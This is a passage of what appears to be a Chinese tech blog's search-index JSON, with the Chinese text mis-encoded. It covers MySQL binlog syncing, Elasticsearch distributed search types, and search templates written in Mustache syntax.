ç­‰çš„äº”ç§æ–¹å¼","uri":"/sync-data-from-mysql/"},{"categories":["MySQL"],"content":"4. è§£æ binlog åŒæ­¥ æ¯”å¦‚è‘—åçš„ canal ã€‚ é€šè¿‡ä¼ªè£…æˆ slave å»è§£æ MySQL çš„ binary log ä»è€Œå¾—çŸ¥æ•°æ®çš„å˜æ›´ã€‚ è¿™æ˜¯ä¸€ç§ä¸šç•Œæ¯”è¾ƒæˆç†Ÿçš„æ–¹æ¡ˆã€‚ è¿™ç§æ–¹å¼è¦æ±‚ä½ å°† MySQL çš„ binlog-format è®¾ç½®ä¸º ROW æ¨¡å¼ã€‚ ","date":"2020-11-30","objectID":"/sync-data-from-mysql/:4:0","tags":["MySQL"],"title":"åŒæ­¥ MySQL æ•°æ®è‡³ Elasticsearch/Redis/MQ ç­‰çš„äº”ç§æ–¹å¼","uri":"/sync-data-from-mysql/"},{"categories":["MySQL"],"content":"5. è§£æ binlog â€“ mixed / statement æ ¼å¼ MySQL çš„ binlog æœ‰ä¸‰ç§æ ¼å¼ï¼š ROW æ¨¡å¼ï¼Œbinlog æŒ‰è¡Œçš„æ–¹å¼å»è®°å½•æ•°æ®çš„å˜æ›´ï¼› statement æ¨¡å¼ï¼Œbinlog è®°å½•çš„æ˜¯ SQL è¯­å¥ï¼› mixed æ¨¡å¼æ—¶ï¼Œæ··åˆä»¥ä¸Šä¸¤ç§ï¼Œè®°å½•çš„å¯èƒ½æ˜¯ SQL è¯­å¥æˆ–è€… ROW æ¨¡å¼çš„æ¯è¡Œå˜æ›´ï¼› æŸäº›æƒ…å†µä¸‹ï¼Œå¯èƒ½ä½ çš„ MySQL binlog æ— æ³•è¢«è®¾ç½®ä¸º ROW æ¨¡å¼ï¼Œè¿™ç§æ—¶å€™ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥å»ç»Ÿä¸€è§£æ binlog ï¼Œä»è€Œå®ŒæˆåŒæ­¥ï¼Œä½†æ˜¯è¿™é‡Œè§£æå‡ºæ¥çš„å½“ç„¶è¿˜æ˜¯åŸå§‹çš„ SQL è¯­å¥æˆ–è€… ROW æ¨¡å¼çš„æ¯è¡Œå˜æ›´ï¼Œè¿™ç§æ—¶å€™æ˜¯éœ€è¦æˆ‘ä»¬å»æ ¹æ®ä¸šåŠ¡è§£æè¿™äº› SQL æˆ–è€…æ¯è¡Œå˜æ›´ï¼Œæ¯”å¦‚åˆ©ç”¨æ­£åˆ™åŒ¹é…æˆ–è€… AST æŠ½è±¡è¯­æ³•æ ‘ç­‰ï¼Œç„¶åæ ¹æ®è§£æçš„ç»“æœå†è¿›è¡Œæ•°æ®çš„åŒæ­¥ã€‚ è¿™ç§æ–¹å¼çš„é™åˆ¶ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œä¸€æ˜¯éœ€è¦è‡ªå·±é€‚é…ä¸šåŠ¡è§£æ SQL ï¼ŒäºŒæ˜¯æ‰¹é‡æ›´æ–°è¿™ç§åœºæ™¯å¯èƒ½å¾ˆéš¾å¤„ç†ï¼Œå½“ç„¶å¦‚æœä½ çš„æ•°æ®éƒ½æ˜¯ç®€å•çš„æ ¹æ®ä¸»é”®è¿›è¡Œä¿®æ”¹æˆ–è€…åˆ é™¤åˆ™èƒ½æ¯”è¾ƒå¥½çš„é€‚ç”¨ã€‚ ","date":"2020-11-30","objectID":"/sync-data-from-mysql/:5:0","tags":["MySQL"],"title":"åŒæ­¥ MySQL æ•°æ®è‡³ Elasticsearch/Redis/MQ ç­‰çš„äº”ç§æ–¹å¼","uri":"/sync-data-from-mysql/"},{"categories":["MySQL"],"content":"ç»“è¯­ æœ€ååˆ—ä¸¾å‡ ä¸ª binlog è§£æçš„å¼€æºåº“ï¼š canal go-mysql zongji ","date":"2020-11-30","objectID":"/sync-data-from-mysql/:6:0","tags":["MySQL"],"title":"åŒæ­¥ MySQL æ•°æ®è‡³ Elasticsearch/Redis/MQ ç­‰çš„äº”ç§æ–¹å¼","uri":"/sync-data-from-mysql/"},{"categories":["Elasticsearch"],"content":"Elasticsearch åˆ†å¸ƒå¼æœç´¢çš„è¿è¡Œæœºåˆ¶ ES æœ‰ä¸¤ç§ search_type å³æœç´¢ç±»å‹ï¼š query_then_fetch ï¼ˆé»˜è®¤ï¼‰ dfs_query_then_fetch ","date":"2020-11-17","objectID":"/es-distribute-search-steps/:0:0","tags":["Elasticsearch"],"title":"Elasticsearch åˆ†å¸ƒå¼æœç´¢çš„è¿è¡Œæœºåˆ¶","uri":"/es-distribute-search-steps/"},{"categories":["Elasticsearch"],"content":"query_then_fetch ç”¨æˆ·å‘èµ·æœç´¢ï¼Œè¯·æ±‚åˆ°é›†ç¾¤ä¸­çš„æŸä¸ªèŠ‚ç‚¹ã€‚ query ä¼šè¢«å‘é€åˆ°æ‰€æœ‰ç›¸å…³çš„ shard åˆ†ç‰‡ä¸Šã€‚ æ¯ä¸ª shard åˆ†ç‰‡ç‹¬ç«‹æ‰§è¡Œ query æœç´¢æ–‡æ¡£å¹¶è¿›è¡Œæ’åºåˆ†é¡µç­‰ï¼Œæ‰“åˆ†æ—¶ä½¿ç”¨çš„æ˜¯åˆ†ç‰‡æœ¬èº«çš„ Local Term/Document é¢‘ç‡ã€‚ åˆ†ç‰‡çš„ query ç»“æœï¼ˆåªæœ‰å…ƒæ•°æ®ï¼Œä¾‹å¦‚ _id å’Œ _scoreï¼‰è¿”å›ç»™è¯·æ±‚èŠ‚ç‚¹ã€‚ è¯·æ±‚èŠ‚ç‚¹å¯¹æ‰€æœ‰åˆ†ç‰‡çš„ query ç»“æœè¿›è¡Œæ±‡æ€»ï¼Œç„¶åæ ¹æ®æ‰“åˆ†æ’åºå’Œåˆ†é¡µï¼Œæœ€åé€‰æ‹©å‡ºæœç´¢ç»“æœæ–‡æ¡£ï¼ˆä¹Ÿåªæœ‰å…ƒæ•°æ®ï¼‰ã€‚ æ ¹æ®å…ƒæ•°æ®å»å¯¹åº”çš„ shard åˆ†ç‰‡æ‹‰å–å­˜å‚¨åœ¨ç£ç›˜ä¸Šçš„æ–‡æ¡£çš„è¯¦ç»†æ•°æ®ã€‚ å¾—åˆ°è¯¦ç»†çš„æ–‡æ¡£æ•°æ®ï¼Œç»„æˆæœç´¢ç»“æœï¼Œå°†ç»“æœè¿”å›ç»™ç”¨æˆ·ã€‚ ç¼ºç‚¹ï¼šç”±äºæ¯ä¸ªåˆ†ç‰‡ç‹¬ç«‹ä½¿ç”¨è‡ªèº«çš„è€Œä¸æ˜¯å…¨å±€çš„ Term/Document é¢‘ç‡è¿›è¡Œç›¸å…³åº¦æ‰“åˆ†ï¼Œå½“æ•°æ®åˆ†å¸ƒä¸å‡åŒ€æ—¶å¯èƒ½ä¼šé€ æˆæ‰“åˆ†åå·®ï¼Œä»è€Œå½±å“æœ€ç»ˆæœç´¢ç»“æœçš„ç›¸å…³æ€§ã€‚ ","date":"2020-11-17","objectID":"/es-distribute-search-steps/:1:0","tags":["Elasticsearch"],"title":"Elasticsearch åˆ†å¸ƒå¼æœç´¢çš„è¿è¡Œæœºåˆ¶","uri":"/es-distribute-search-steps/"},{"categories":["Elasticsearch"],"content":"dfs_query_then_fetch dfs_query_then_fetch ä¸ query_then_fetch çš„è¿è¡Œæœºåˆ¶éå¸¸ç±»ä¼¼ï¼Œä½†æ˜¯æœ‰ä¸¤ç‚¹ä¸åŒã€‚ ç”¨æˆ·å‘èµ·æœç´¢ï¼Œè¯·æ±‚åˆ°é›†ç¾¤ä¸­çš„æŸä¸ªèŠ‚ç‚¹ã€‚ é¢„æŸ¥è¯¢æ¯ä¸ªåˆ†ç‰‡ï¼Œå¾—åˆ°å…¨å±€çš„ Global Term/Document é¢‘ç‡ã€‚ query ä¼šè¢«å‘é€åˆ°æ‰€æœ‰ç›¸å…³çš„ shard åˆ†ç‰‡ä¸Šã€‚ æ¯ä¸ª shard åˆ†ç‰‡ç‹¬ç«‹æ‰§è¡Œ query æœç´¢æ–‡æ¡£å¹¶è¿›è¡Œæ’åºåˆ†é¡µç­‰ï¼Œæ‰“åˆ†æ—¶ä½¿ç”¨çš„æ˜¯åˆ†ç‰‡æœ¬èº«çš„ Global Term/Document é¢‘ç‡ã€‚ åˆ†ç‰‡çš„ query ç»“æœï¼ˆåªæœ‰å…ƒæ•°æ®ï¼Œä¾‹å¦‚ _id å’Œ _scoreï¼‰è¿”å›ç»™è¯·æ±‚èŠ‚ç‚¹ã€‚ è¯·æ±‚èŠ‚ç‚¹å¯¹æ‰€æœ‰åˆ†ç‰‡çš„ query ç»“æœè¿›è¡Œæ±‡æ€»ï¼Œç„¶åæ ¹æ®æ‰“åˆ†æ’åºå’Œåˆ†é¡µï¼Œæœ€åé€‰æ‹©å‡ºæœç´¢ç»“æœæ–‡æ¡£ï¼ˆä¹Ÿåªæœ‰å…ƒæ•°æ®ï¼‰ã€‚ æ ¹æ®å…ƒæ•°æ®å»å¯¹åº”çš„ shard åˆ†ç‰‡æ‹‰å–å­˜å‚¨åœ¨ç£ç›˜ä¸Šçš„æ–‡æ¡£çš„è¯¦ç»†æ•°æ®ã€‚ å¾—åˆ°è¯¦ç»†çš„æ–‡æ¡£æ•°æ®ï¼Œç»„æˆæœç´¢ç»“æœï¼Œå°†ç»“æœè¿”å›ç»™ç”¨æˆ·ã€‚ ç¼ºç‚¹ï¼šå¤ªè€—è´¹èµ„æºï¼Œä¸€èˆ¬è¿˜æ˜¯ä¸å»ºè®®ä½¿ç”¨ã€‚ ","date":"2020-11-17","objectID":"/es-distribute-search-steps/:2:0","tags":["Elasticsearch"],"title":"Elasticsearch åˆ†å¸ƒå¼æœç´¢çš„è¿è¡Œæœºåˆ¶","uri":"/es-distribute-search-steps/"},{"categories":["Elasticsearch"],"content":"ç»éªŒ è™½ç„¶ ES æœ‰ä¸¤ç§æœç´¢ç±»å‹ï¼Œä½†ä¸€èˆ¬è¿˜æ˜¯éƒ½ç”¨é»˜è®¤çš„ query_then_fetch ã€‚ å½“æ•°æ®é‡æ²¡æœ‰è¶³å¤Ÿå¤§çš„æƒ…å†µä¸‹ï¼ˆæ¯”å¦‚æœç´¢ç±»å‹æ•°æ® 20GBï¼Œæ—¥å¿—ç±»å‹æ•°æ® 20-50GBï¼‰ï¼Œè®¾ç½®ä¸€ä¸ª shard ä¸»åˆ†ç‰‡æ˜¯æ¯”è¾ƒæ¨èçš„ï¼Œåªè®¾ç½®ä¸€ä¸ªä¸»åˆ†ç‰‡ï¼Œä½ ä¼šå‘ç°æœç´¢æ—¶çœæ‰äº†å¥½å¤šäº‹æƒ…ã€‚ ä¸éœ€è¦æ–‡æ¡£æ•°æ®æ—¶ï¼Œä½¿ç”¨ _source: false å¯ä»¥é¿å…è¯·æ±‚èŠ‚ç‚¹åˆ°éæœ¬æœºåˆ†ç‰‡çš„ç½‘ç»œè€—æ—¶ä»¥åŠè¯»å–ç£ç›˜æ–‡ä»¶çš„è€—æ—¶ã€‚ ä½¿ç”¨ from + size åˆ†é¡µæ—¶ï¼Œå‡è®¾ä½ åªéœ€è¦å‰ 10k æ¡æ•°æ®é‡Œçš„æœ€ååæ¡ï¼Œé‚£ä¹ˆæ¯ä¸ªåˆ†ç‰‡ä¹Ÿä¼šå– 10k æ¡æ•°æ®ï¼Œå¦‚æœä½ çš„ç´¢å¼•æœ‰ 5 ä¸ªä¸»åˆ†ç‰‡ï¼Œé‚£ä¹ˆæ±‡æ€»æ—¶å°±æœ‰ 5 * 10k = 50k æ¡æ•°æ®ï¼Œè¿™ 50k æ¡æ•°æ®æ˜¯åœ¨å†…å­˜é‡Œè¿›è¡Œæ’åºå’Œæœ€åçš„åˆ†é¡µçš„ï¼Œæ‰€ä»¥æ·±åº¦åˆ†é¡µä¹Ÿæ˜¯æ¯”è¾ƒåƒèµ„æºçš„ã€‚ ","date":"2020-11-17","objectID":"/es-distribute-search-steps/:3:0","tags":["Elasticsearch"],"title":"Elasticsearch åˆ†å¸ƒå¼æœç´¢çš„è¿è¡Œæœºåˆ¶","uri":"/es-distribute-search-steps/"},{"categories":["Elasticsearch"],"content":"Elasticsearch Search Template","date":"2020-11-16","objectID":"/es-search-template/","tags":["Elasticsearch"],"title":"Elasticsearch Search Template","uri":"/es-search-template/"},{"categories":["Elasticsearch"],"content":"Elasticsearch Search Template æ‰€è°“ search template æœç´¢æ¨¡æ¿å…¶å®å°±æ˜¯ï¼š é¢„å…ˆå®šä¹‰å¥½æŸ¥è¯¢è¯­å¥ DSL çš„ç»“æ„å¹¶é¢„ç•™å‚æ•° æœç´¢çš„æ—¶å†ä¼ å…¥å‚æ•°å€¼ æ¸²æŸ“å‡ºå®Œæ•´çš„ DSL ï¼Œæœ€åè¿›è¡Œæœç´¢ ä½¿ç”¨æœç´¢æ¨¡æ¿å¯ä»¥å°† DSL ä»åº”ç”¨ç¨‹åºä¸­è§£è€¦å‡ºæ¥ï¼Œå¹¶ä¸”å¯ä»¥æ›´åŠ çµæ´»çš„æ›´æ”¹æŸ¥è¯¢è¯­å¥ã€‚ ä¾‹å¦‚ï¼š GET _search/template { \"source\" : { \"query\": { \"match\" : { \"{{my_field}}\" : \"{{my_value}}\" } } }, \"params\" : { \"my_field\" : \"message\", \"my_value\" : \"foo\" } } æ„é€ å‡ºæ¥çš„ DSL å°±æ˜¯ï¼š { \"query\": { \"match\": { \"message\": \"foo\" } } } åœ¨æ¨¡æ¿ä¸­é€šè¿‡ {{ }} çš„æ–¹å¼é¢„ç•™å‚æ•°ï¼Œç„¶åæŸ¥è¯¢æ—¶å†æŒ‡å®šå¯¹åº”çš„å‚æ•°å€¼ï¼Œæœ€åå¡«å……æˆå…·ä½“çš„æŸ¥è¯¢è¯­å¥è¿›è¡Œæœç´¢ã€‚ ","date":"2020-11-16","objectID":"/es-search-template/:0:0","tags":["Elasticsearch"],"title":"Elasticsearch Search Template","uri":"/es-search-template/"},{"categories":["Elasticsearch"],"content":"æœç´¢æ¨¡æ¿ API ä¸ºäº†å®ç°æœç´¢æ¨¡æ¿å’ŒæŸ¥è¯¢åˆ†ç¦»ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦å•ç‹¬ä¿å­˜å’Œç®¡ç†æœç´¢æ¨¡æ¿ã€‚ ä¿å­˜æœç´¢æ¨¡æ¿ ä½¿ç”¨ scripts API ä¿å­˜æœç´¢æ¨¡æ¿ï¼ˆä¸å­˜åœ¨åˆ™åˆ›å»ºï¼Œå­˜åœ¨åˆ™è¦†ç›–ï¼‰ã€‚ç¤ºä¾‹ï¼š POST _scripts/\u003ctemplateid\u003e { \"script\": { \"lang\": \"mustache\", \"source\": { \"query\": { \"match\": { \"title\": \"{{query_string}}\" } } } } } æŸ¥è¯¢æœç´¢æ¨¡æ¿ GET _scripts/\u003ctemplateid\u003e åˆ é™¤æœç´¢æ¨¡æ¿ DELETE _scripts/\u003ctemplateid\u003e ä½¿ç”¨æœç´¢æ¨¡æ¿ ç¤ºä¾‹ï¼š GET _search/template { \"id\": \"\u003ctemplateid\u003e\", \"params\": { \"query_string\": \"search words\" } } params ä¸­çš„å‚æ•°ä¸æœç´¢æ¨¡æ¿ä¸­å®šä¹‰çš„ä¸€è‡´ï¼Œä¸Šæ–‡ä¿å­˜æœç´¢æ¨¡æ¿çš„ç¤ºä¾‹æ˜¯ {{query_string}}ï¼Œæ‰€ä»¥è¿™é‡Œè¿›è¡Œæœç´¢æ—¶å¯¹åº”çš„å‚æ•°å°±æ˜¯ query_string ã€‚ æ£€éªŒæœç´¢æ¨¡æ¿ æœ‰æ—¶å€™æˆ‘ä»¬æƒ³çœ‹çœ‹æœç´¢æ¨¡æ¿è¾“å…¥äº†å‚æ•°ä¹‹åæ¸²æŸ“æˆçš„ DSL åˆ°åº•é•¿å•¥æ ·ã€‚ ç¤ºä¾‹ï¼š GET _render/template { \"source\": \"{ \\\"query\\\": { \\\"terms\\\": {{#toJson}}statuses{{/toJson}} }}\", \"params\": { \"statuses\" : { \"status\": [ \"pending\", \"published\" ] } } } è¿”å›çš„ç»“æœå°±æ˜¯ï¼š { \"template_output\": { \"query\": { \"terms\": { \"status\": [ \"pending\", \"published\" ] } } } } {{#toJson}} {{/toJson}} å°±æ˜¯è½¬æ¢æˆ json æ ¼å¼ã€‚ å·²ç»ä¿å­˜çš„æœç´¢æ¨¡æ¿å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æŸ¥çœ‹æ¸²æŸ“ç»“æœï¼š GET _render/template/\u003ctemplate_name\u003e { \"params\": { \"...\" } } ä½¿ç”¨ explain å’Œ profile å‚æ•° ç¤ºä¾‹ï¼š GET _search/template { \"id\": \"my_template\", \"params\": { \"status\": [ \"pending\", \"published\" ] }, \"explain\": true } GET _search/template { \"id\": \"my_template\", \"params\": { \"status\": [ \"pending\", \"published\" ] }, \"profile\": true } ","date":"2020-11-16","objectID":"/es-search-template/:1:0","tags":["Elasticsearch"],"title":"Elasticsearch Search Template","uri":"/es-search-template/"},{"categories":["Elasticsearch"],"content":"æ¨¡æ¿æ¸²æŸ“ å¡«å……ç®€å•å€¼ GET _search/template { \"source\": { \"query\": { \"term\": { \"message\": \"{{query_string}}\" } } }, \"params\": { \"query_string\": \"search words\" } } æ¸²æŸ“å‡ºæ¥çš„ DSL å°±æ˜¯ï¼š { \"query\": { \"term\": { \"message\": \"search words\" } } } å°†å‚æ•°è½¬æ¢ä¸º JSON ä½¿ç”¨ {{#toJson}}parameter{{/toJson}} ä¼šå°†å‚æ•°è½¬æ¢ä¸º JSONã€‚ GET _search/template { \"source\": \"{ \\\"query\\\": { \\\"terms\\\": {{#toJson}}statuses{{/toJson}} }}\", \"params\": { \"statuses\" : { \"status\": [ \"pending\", \"published\" ] } } } æ¸²æŸ“å‡ºæ¥çš„ DSL å°±æ˜¯ï¼š { \"query\": { \"terms\": { \"status\": [ \"pending\", \"published\" ] } } } å¯¹è±¡æ•°ç»„çš„æ¸²æŸ“ç¤ºä¾‹ï¼š GET _search/template { \"source\": \"{\\\"query\\\":{\\\"bool\\\":{\\\"must\\\": {{#toJson}}clauses{{/toJson}} }}}\", \"params\": { \"clauses\": [ { \"term\": { \"user\" : \"foo\" } }, { \"term\": { \"user\" : \"bar\" } } ] } } æ¸²æŸ“ç»“æœå°±æ˜¯ï¼š { \"query\": { \"bool\": { \"must\": [ { \"term\": { \"user\" : \"foo\" } }, { \"term\": { \"user\" : \"bar\" } } ] } } } å°†æ•°ç»„ join æˆå­—ç¬¦ä¸² ä½¿ç”¨ {{#join}}array{{/join}} å¯ä»¥å°†æ•°ç»„ join æˆå­—ç¬¦ä¸²ã€‚ ç¤ºä¾‹ï¼š GET _search/template { \"source\": { \"query\": { \"match\": { \"emails\": \"{{#join}}emails{{/join}}\" } } }, \"params\": { \"emails\": [ \"aaa\", \"bbb\" ] } } æ¸²æŸ“ç»“æœï¼š { \"query\" : { \"match\" : { \"emails\" : \"aaa,bbb\" } } } é™¤äº†é»˜è®¤ä»¥ , åˆ†éš”å¤–ï¼Œè¿˜å¯ä»¥è‡ªå®šä¹‰åˆ†éš”ç¬¦ï¼Œç¤ºä¾‹ï¼š { \"source\": { \"query\": { \"range\": { \"born\": { \"gte\": \"{{date.min}}\", \"lte\": \"{{date.max}}\", \"format\": \"{{#join delimiter='||'}}date.formats{{/join delimiter='||'}}\" } } } }, \"params\": { \"date\": { \"min\": \"2016\", \"max\": \"31/12/2017\", \"formats\": [ \"dd/MM/yyyy\", \"yyyy\" ] } } } ä¾‹å­ä¸­çš„ {{#join delimiter='||'}} {{/join delimiter='||'}} æ„æ€å°±æ˜¯è¿›è¡Œ join æ“ä½œï¼Œåˆ†éš”ç¬¦è®¾ç½®ä¸º || ï¼Œæ¸²æŸ“ç»“æœå°±æ˜¯ï¼š { \"query\": { \"range\": { \"born\": { \"gte\": \"2016\", \"lte\": \"31/12/2017\", \"format\": \"dd/MM/yyyy||yyyy\" } } } } é»˜è®¤å€¼ ä½¿ç”¨ {{var}}{{^var}}default{{/var}} çš„æ–¹å¼è®¾ç½®é»˜è®¤å€¼ã€‚ ç¤ºä¾‹ï¼š { \"source\": { \"query\": { \"range\": { \"line_no\": { \"gte\": \"{{start}}\", \"lte\": \"{{end}}{{^end}}20{{/end}}\" } } } }, \"params\": { ... } } {{end}}{{^end}}20{{/end}} å°±æ˜¯ç»™ end è®¾ç½®äº†é»˜è®¤å€¼ä¸º 20 ã€‚ å½“ params æ˜¯ { \"start\": 10, \"end\": 15 } æ—¶ï¼Œæ¸²æŸ“ç»“æœæ˜¯ï¼š { \"range\": { \"line_no\": { \"gte\": \"10\", \"lte\": \"15\" } } } å½“ params æ˜¯ { \"start\": 10 } æ—¶ï¼Œend å°±ä¼šä½¿ç”¨é»˜è®¤å€¼ï¼Œæ¸²æŸ“ç»“æœå°±æ˜¯ï¼š { \"range\": { \"line_no\": { \"gte\": \"10\", \"lte\": \"20\" } } } æ¡ä»¶å­å¥ æœ‰æ—¶å€™æˆ‘ä»¬çš„å‚æ•°æ˜¯å¯é€‰çš„ï¼Œè¿™æ—¶å€™å°±å¯ä»¥ä½¿ç”¨ {{#key}} {{/key}}çš„è¯­æ³•ã€‚ ç¤ºä¾‹ï¼Œå‡è®¾å‚æ•° line_no, start, end éƒ½æ˜¯å¯é€‰çš„ï¼Œä½¿ç”¨ {{#key}} {{/key}} å½¢å¦‚ï¼š { \"query\": { \"bool\": { \"must\": { \"match\": { \"line\": \"{{text}}\" } }, \"filter\": { {{#line_no}} \"range\": { \"line_no\": { {{#start}} \"gte\": \"{{start}}\" {{#end}},{{/end}} {{/start}} {{#end}} \"lte\": \"{{end}}\" {{/end}} } } {{/line_no}} } } } } 1ã€ å½“å‚æ•°ä¸ºï¼š { \"params\": { \"text\": \"words to search for\", \"line_no\": { \"start\": 10, \"end\": 20 } } } æ¸²æŸ“ç»“æœæ˜¯ï¼š { \"query\": { \"bool\": { \"must\": { \"match\": { \"line\": \"words to search for\" } }, \"filter\": { \"range\": { \"line_no\": { \"gte\": \"10\", \"lte\": \"20\" } } } } } } 2ã€ å½“å‚æ•°ä¸ºï¼š { \"params\": { \"text\": \"words to search for\" } } æ¸²æŸ“ç»“æœä¸ºï¼š { \"query\": { \"bool\": { \"must\": { \"match\": { \"line\": \"words to search for\" } }, \"filter\": {} } } } 3ã€å½“å‚æ•°ä¸ºï¼š { \"params\": { \"text\": \"words to search for\", \"line_no\": { \"start\": 10 } } } æ¸²æŸ“ç»“æœä¸ºï¼š { \"query\": { \"bool\": { \"must\": { \"match\": { \"line\": \"words to search for\" } }, \"filter\": { \"range\": { \"line_no\": { \"gte\": 10 } } } } } } 4ã€å½“å‚æ•°ä¸ºï¼š { \"params\": { \"text\": \"words to search for\", \"line_no\": { \"end\": 20 } } } æ¸²æŸ“ç»“æœä¸ºï¼š { \"query\": { \"bool\": { \"must\": { \"match\": { \"line\": \"words to search for\" } }, \"filter\": { \"range\": { \"line_no\": { \"lte\": 20 } } } } } } éœ€è¦æ³¨æ„çš„æ˜¯åœ¨ JSON å¯¹è±¡ä¸­ï¼Œ { \"filter\": { {{#line_no}} ... {{/line_no}} } } è¿™æ ·ç›´æ¥å†™ {{#line_no}} è‚¯å®šæ˜¯éæ³•çš„JSONæ ¼å¼ï¼Œä½ å¿…é¡»è½¬æ¢ä¸º JSON å­—ç¬¦ä¸²ã€‚ URLs ç¼–ç  ä½¿ç”¨ {{#url}}value{{/url}} çš„æ–¹å¼å¯ä»¥è¿›è¡Œ HTML ç¼–ç è½¬ä¹‰ã€‚ ç¤ºä¾‹ï¼š GET _render/template { \"source\": { \"query\": { \"term\": { \"http_access_log\": \"{{#url}}{{host}}/{{page}}{{/url}}\" } } }, \"params\": { \"host\": \"https://www.elastic.co/\", \"page\": \"learn\" } } æ¸²æŸ“ç»“æœï¼š { \"template_output\": { \"query\": { \"term\": { \"http_access_log\": \"https%3A%2F%2Fwww.elastic.co%2F%2Flearn\" } } } } ","date":"2020-11-16","objectID":"/es-search-template/:2:0","tags":["Elasticsearch"],"title":"Elasticsearch Search Template","uri":"/es-search-template/"},{"categories":["Elasticsearch"],"content":"Mustache åŸºæœ¬è¯­æ³• ä¸Šæ–‡ä¸­çš„ {{ }} è¯­æ³•å…¶å®å°±æ˜¯ mustache language ï¼Œè¡¥å……ä»‹ç»ä¸‹åŸºæœ¬çš„è¯­æ³•è§„åˆ™ã€‚ ä½¿ç”¨ {{key}} æ¨¡æ¿ï¼šHello {{name}} è¾“å…¥ï¼š { \"name\": \"Chris\" } è¾“å‡ºï¼šHello Chris ä½¿ç”¨ {{{key}}} é¿å…è½¬ä¹‰ æ‰€æœ‰å˜é‡éƒ½ä¼šé»˜è®¤è¿›è¡Œ HTML è½¬ä¹‰ã€‚ æ¨¡æ¿ï¼š{{company}} è¾“å…¥ï¼š { \"company\": \"\u003cb\u003eGitHub\u003c/b\u003e\" } è¾“å‡ºï¼š\u0026lt;b\u0026gt;GitHub\u0026lt;/b\u0026gt; ä½¿ç”¨ {{{ }}} é¿å…è½¬ä¹‰ã€‚ æ¨¡æ¿ï¼š{{{company}}} è¾“å…¥ï¼š { \"company\": \"\u003cb\u003eGitHub\u003c/b\u003e\" } è¾“å‡ºï¼š\u003cb\u003eGitHub\u003c/b\u003e ä½¿ç”¨ {{#key}} {{/key}} æ„é€ åŒºå— 1ã€ å½“ key æ˜¯ false æˆ–è€…ç©ºåˆ—è¡¨å°†ä¼šå¿½ç•¥ æ¨¡æ¿ï¼š Shown. {{#person}} Never shown! {{/person}} è¾“å…¥ï¼š { \"person\": false } è¾“å‡ºï¼š Shown. 2ã€ å½“ key éç©ºå€¼åˆ™æ¸²æŸ“å¡«å…… æ¨¡æ¿ï¼š {{#repo}} \u003cb\u003e{{name}}\u003c/b\u003e {{/repo}} è¾“å…¥ï¼š { \"repo\": [ { \"name\": \"resque\" }, { \"name\": \"hub\" }, { \"name\": \"rip\" } ] } è¾“å‡ºï¼š \u003cb\u003eresque\u003c/b\u003e \u003cb\u003ehub\u003c/b\u003e \u003cb\u003erip\u003c/b\u003e 3ã€å½“ key æ˜¯å‡½æ•°åˆ™è°ƒç”¨åæ¸²æŸ“ æ¨¡æ¿ï¼š {{#wrapped}} {{name}} is awesome. {{/wrapped}} è¾“å…¥ï¼š { \"name\": \"Willy\", \"wrapped\": function() { return function(text, render) { return \"\u003cb\u003e\" + render(text) + \"\u003c/b\u003e\" } } } è¾“å‡ºï¼š \u003cb\u003eWilly is awesome.\u003c/b\u003e 4ã€å½“ key æ˜¯é false ä¸”éåˆ—è¡¨ æ¨¡æ¿ï¼š {{#person?}} Hi {{name}}! {{/person?}} è¾“å…¥ï¼š { \"person?\": { \"name\": \"Jon\" } } è¾“å‡ºï¼š Hi Jon! ä½¿ç”¨ {{^key}} {{/key}} æ„é€ ååŒºå— {{^key}} {{/key}} çš„è¯­æ³•ä¸ {{#key}} {{/key}} ç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯ï¼Œå½“ key ä¸å­˜åœ¨ï¼Œæˆ–è€…æ˜¯ false ï¼Œåˆæˆ–è€…æ˜¯ç©ºåˆ—è¡¨æ—¶æ‰æ¸²æŸ“è¾“å‡ºåŒºå—å†…å®¹ã€‚ æ¨¡æ¿ï¼š {{#repo}} \u003cb\u003e{{name}}\u003c/b\u003e {{/repo}} {{^repo}} No repos :( {{/repo}} è¾“å…¥ï¼š { \"repo\": [] } è¾“å‡ºï¼š No repos :( ä½¿ç”¨ {{! }} æ·»åŠ æ³¨é‡Š {{! }} æ³¨é‡Šå†…å®¹å°†ä¼šè¢«å¿½ç•¥ã€‚ æ¨¡æ¿ï¼š \u003ch1\u003eToday{{! ignore me }}.\u003c/h1\u003e è¾“å‡ºï¼š \u003ch1\u003eToday.\u003c/h1\u003e ä½¿ç”¨ {{\u003e }} å­æ¨¡å— æ¨¡æ¿ï¼š base.mustache: \u003ch2\u003eNames\u003c/h2\u003e {{#names}} {{\u003e user}} {{/names}} user.mustache: \u003cstrong\u003e{{name}}\u003c/strong\u003e å…¶å®ä¹Ÿå°±ç­‰ä»·äºï¼š \u003ch2\u003eNames\u003c/h2\u003e {{#names}} \u003cstrong\u003e{{name}}\u003c/strong\u003e {{/names}} ä½¿ç”¨ {{= =}} è‡ªå®šä¹‰å®šç•Œç¬¦ æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦æ”¹å˜é»˜è®¤çš„å®šç•Œç¬¦ {{ }} ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨ {{= =}} çš„æ–¹å¼è‡ªå®šä¹‰å®šç•Œç¬¦ã€‚ ä¾‹å¦‚ï¼š {{=\u003c% %\u003e=}} å®šç•Œç¬¦è¢«å®šä¹‰ä¸ºäº† \u003c% %\u003eï¼Œè¿™æ ·åŸå…ˆ {{key}} çš„ä½¿ç”¨æ–¹å¼å°±å˜æˆäº† \u003c%key%\u003eã€‚ å†ä½¿ç”¨ï¼š \u003c%={{ }}=%\u003e å°±é‡æ–°æŠŠå®šç•Œç¬¦æ”¹å›äº† {{ }}ã€‚ æ›´å¤šè¯­æ³•è¯¦æƒ…è¯·æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ mustache language ã€‚ ","date":"2020-11-16","objectID":"/es-search-template/:3:0","tags":["Elasticsearch"],"title":"Elasticsearch Search Template","uri":"/es-search-template/"},{"categories":["Elasticsearch"],"content":"ç»“è¯­ ä½¿ç”¨ search template å¯ä»¥å¯¹æœç´¢è¿›è¡Œæœ‰æ•ˆçš„è§£è€¦ï¼Œå³åº”ç”¨ç¨‹åºåªéœ€è¦å…³æ³¨æœç´¢å‚æ•°ä¸è¿”å›ç»“æœï¼Œè€Œä¸ç”¨å…³æ³¨å…·ä½“ä½¿ç”¨çš„ DSL 